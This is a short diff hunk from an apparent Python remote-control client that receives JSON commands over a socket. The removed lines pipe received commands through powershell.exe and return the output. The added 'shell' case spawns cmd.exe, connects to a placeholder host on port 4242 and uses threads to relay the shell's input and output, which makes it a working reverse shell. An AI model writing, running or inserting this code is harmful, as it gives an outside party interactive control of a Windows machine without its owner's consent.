@@ -15,9 +15,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         data = json.loads(sock.recv(1024).decode())
         print(data)
         match data[0]:
-            case "command":
-                proc = subprocess.Popen('powershell.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
-                output, error = proc.communicate(data[1].encode())
-                time.sleep(0.5)
-                print(output)
-                send_data(sock, output.decode())
+            case "shell":
+                p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+                s=socket.socket()
+                s.connect(('HOST',4242))
+                while True:
+                    threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
+                    threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
